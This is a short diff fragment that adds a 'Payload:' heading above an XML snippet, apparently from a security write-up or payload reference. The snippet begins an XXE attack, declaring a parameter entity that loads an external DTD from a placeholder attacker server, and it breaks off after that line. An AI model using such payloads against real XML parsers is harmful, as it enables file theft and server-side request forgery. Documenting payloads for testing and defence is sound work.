@@ -1,3 +1,4 @@
+<b>Payload:</b>
 ```xml
 <?xml version=\"1.0\"?>
 <!DOCTYPE message [<!ENTITY % local_dtd SYSTEM \"http://{Attacker_server}/test.dtd\">
